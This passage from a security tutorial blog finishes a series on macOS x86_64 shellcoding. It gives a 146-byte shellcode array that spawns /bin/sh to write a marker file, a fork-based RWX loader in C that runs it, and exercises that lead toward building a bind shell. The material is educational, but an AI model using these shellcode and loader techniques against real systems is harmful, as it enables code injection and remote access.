00000000: 5548 89e5 48b8 2f62 696e 2f73 6800 4889  UH..H./bin/sh.H.
00000010: 45f0 48c7 45f8 2d63 0000 48b8 6563 686f  E.H.E.-c..H.echo
```

You can even see `/bin/sh` and `echo` sitting in the dump — our stack-built strings as `movabs` immediates.

> Note: whatever you do, **do not hand-type the byte array into the loader**. During the testing of this very post, a hand-copied array turned out to be `154` bytes instead of `146` with corruption starting at offset `36` — and the “mysteriously crashing” loader cost us a debugging session that ended at `cmp` between two arrays. Always `xxd -i shellcode.bin > shellcode.h` and `#include` it. The machine is better at copying 146 bytes than you are, Accept it.

Generate the `C` array the right way:

```
shellcoding % xxd -i shellcode.bin > shellcode.h
shellcoding % cat shellcode.h
unsigned char shellcode_bin[] = {
  0x55, 0x48, 0x89, 0xe5, 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73,
  0x68, 0x00, 0x48, 0x89, 0x45, 0xf0, 0x48, 0xc7, 0x45, 0xf8, 0x2d, 0x63,
  0x00, 0x00, 0x48, 0xb8, 0x65, 0x63, 0x68, 0x6f, 0x20, 0x22, 0x57, 0x30,
  0x30, 0x74, 0x57, 0x30, 0x30, 0x74, 0x22, 0x20, 0x48, 0x89, 0x45, 0xc0,
  0x48, 0xb8, 0x30, 0x74, 0x57, 0x30, 0x30, 0x74, 0x22, 0x20, 0x48, 0x89,
  0x45, 0xc8, 0x48, 0xb8, 0x3e, 0x20, 0x2f, 0x74, 0x6d, 0x70, 0x2f, 0x50,
  0x48, 0x89, 0x45, 0xd0, 0x48, 0xb8, 0x77, 0x6e, 0x65, 0x64, 0x2e, 0x74,
  0x78, 0x74, 0x48, 0x89, 0x45, 0xd8, 0xc6, 0x45, 0xe0, 0x00, 0x48, 0x8d,
  0x7d, 0xf0, 0x48, 0x89, 0x45, 0xa0, 0x48, 0x8d, 0x45, 0xf8, 0x48, 0x89,
  0x45, 0xa8, 0x48, 0x8d, 0x45, 0xc0, 0x48, 0x89, 0x45, 0xb0, 0x48, 0xc7,
  0x45, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x75, 0xa0, 0xb8, 0x3b,
  0x00, 0x00, 0x02, 0x31, 0xd2, 0x0f, 0x05, 0xb8, 0x01, 0x00, 0x00, 0x02,
  0x31, 0xff, 0x31, 0xf6, 0x31, 0xd2, 0x0f, 0x05, 0x0f, 0x0b
};
unsigned int shellcode_bin_len = 146;
```

**Stage 3 — the loader.** The same fork-based loader from our `x86_64` assembly post — `mmap` an `RWX` page (allowed on `Intel`, remember our `ARM64` post where Apple Silicon said no), copy the blob, cast, call, And the parent checks the side-effect. This time we `#include` the generated header instead of pasting bytes — lesson learned:

```C
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/wait.h>
#include <stdlib.h>
#include "shellcode.h"   /* generated by: xxd -i shellcode.bin > shellcode.h */

int main(void) {
    unsigned char *code = shellcode_bin;
    size_t len = shellcode_bin_len;

    pid_t pid = fork();
    if (pid < 0) {
        perror("fork");
        return 1;
    }

    if (pid == 0) {
        // child: allocate RWX, copy shellcode and execute
        void *exec = mmap(NULL, len, PROT_READ|PROT_WRITE|PROT_EXEC,
                          MAP_ANON|MAP_PRIVATE, -1, 0);
        if (exec == MAP_FAILED) {
            perror("mmap");
            _exit(127);
        }
        memcpy(exec, code, len);

        int (*func)() = (int(*)())exec;
        int r = func();   // if shellcode calls execve, child will be replaced
        _exit(r & 0xFF);
    } else {
        // parent: wait for child and then check side-effect
        int status = 0;
        printf("[parent %d] spawned child %d, waiting...\n", getpid(), pid);
        fflush(stdout);

        if (waitpid(pid, &status, 0) == -1) {
            perror("waitpid");
            return 2;
        }

        if (WIFEXITED(status)) {
            printf("[parent] child exited with status %d\n", WEXITSTATUS(status));
        } else if (WIFSIGNALED(status)) {
            printf("[parent] child killed by signal %d\n", WTERMSIG(status));
        }

        usleep(200000);

        const char *check_path = "/tmp/Pwned.txt";
        if (access(check_path, F_OK) == 0) {
            printf("[parent] Success: '%s' exists.\n", check_path);
            return 0;
        } else {
            printf("[parent] Failure: '%s' not found (errno=%d: %s)\n",
                   check_path, errno, strerror(errno));
            return 3;
        }
    }
}
```

Compile and fire:

```
shellcoding % clang -arch x86_64 -o cloader cloader.c
shellcoding % rm -f /tmp/Pwned.txt
shellcoding % ./cloader 
[parent 90000] spawned child 90001, waiting...
[child 90001] executing shellcode (146 bytes)...
[parent] child exited with status 0
[parent] Success: '/tmp/Pwned.txt' exists.
shellcoding % cat /tmp/Pwned.txt 
W00tW00t
```

Our `C`-written shellcode, extracted from the compiler’s output, Executed from an anonymous `RWX` page — And the file is there. Full circle.

<img width="1454" height="805" alt="image" src="https://github.com/user-attachments/assets/4e13400b-a7d4-44fc-b708-3bf92db680e6" />


# Conclusion

We closed the loop on our `macOS` shellcoding series: instead of hand-writing assembly, We wrote our shellcode in `C` and made the compiler produce it for us — On the same `x86_64` Intel Mac, With Apple `clang` — Using **two methods**, Cooking the same `W00tW00t` payload both times. **Method 1** eliminated the compiler’s bad habits entirely: `RIP`-relative addressing, outsourced `libc` calls, stack protector, relocations — neutralized with stack-built immediate strings, inline-assembly syscall wrappers, And the exact compile recipe `-O2 -ffreestanding -fno-stack-protector -fno-builtin`, Verified by the silent trio (`nm -u`, `grep rip`, `otool -r`) — Producing a `146`-byte, reloc-free, syscall-only blob that runs anywhere, Any boot. **Method 2** embraced `libc` through function-pointer placeholders — `typedef` + cast + `call rax` — Patched with the real shared-cache address read at runtime, Which makes it position-dependent (dies on reboot) But perfect for local exploitation, And blazing fast to develop. We also collected two bonus lessons the hard way: modern `clang` folds the classic char-array trick back into `rip`-dependent literals (element-wise assignments and `u64` immediates are the cure), A never hand-copy shellcode bytes into a `C` array — let `xxd -i` do it. The same workflows port straight to `ARM64` from our previous post — same rules, Different immediate sizes (`movz`/`movk` instead of `movabs`) and `svc #0x80` instead of `syscall`. This foundation sets the stage for more advanced topics.

# Exercises

If you want to flex both methods, Here are two challenges:

- **Method 1:** Recreate the `BindShell` from our `x86_64` assembly post — But in `C`, Syscall-only, Using the `sc3`/`sc4` inline-assembly wrappers. Remember the `BSD` syscall numbers for `socket` = `97`, `bind` = `104`, `listen` = `106`, `accept` = `30`, `dup2` = `90` (verify them in `syscalls.master`!), And that the 4th+ syscall arguments travel in `R10` — Extend your wrapper accordingly.
- **Method 2:** Take the same `BindShell` `C` code from our `x86_64` post (the one with `socket()`, `bind()`, `listen()`, `accept()` and the `dup2` loop) — And apply the Method 2 treatment: replace every `libc` call with a function-pointer placeholder, Build every string with immediates, Fetch the real addresses at runtime with a `getaddress`-style helper, Then patch, Extract, And load it. Compare the effort with the Method 1 version and you’ll see exactly why this technique exists — And remember: the moment your Mac reboots, All those beautiful addresses turn into pumpkins.

## Help ?

If you got any questions or need help, You can contact me:

- [Linkedin](https://www.linkedin.com/in/zer0verflow/)
- [Twitter/X](https://x.com/AzimaZeyad)
- Email: [contact@zeyadazima.com](mailto:contact@zeyadazima.com)
- Discord: `.killer_1337` including `.`

# References

- https://github.com/Zeyad-Azima/macOShellcoding
- https://opensource.apple.com/releases/
- https://github.com/apple-oss-distributions/xnu
- https://codebrowser.dev/
- https://man.freebsd.org/
- https://pubs.opengroup.org
- https://developer.apple.com/documentation/xcode/writing-arm64-code-for-apple-platforms
- https://newosxbook.com
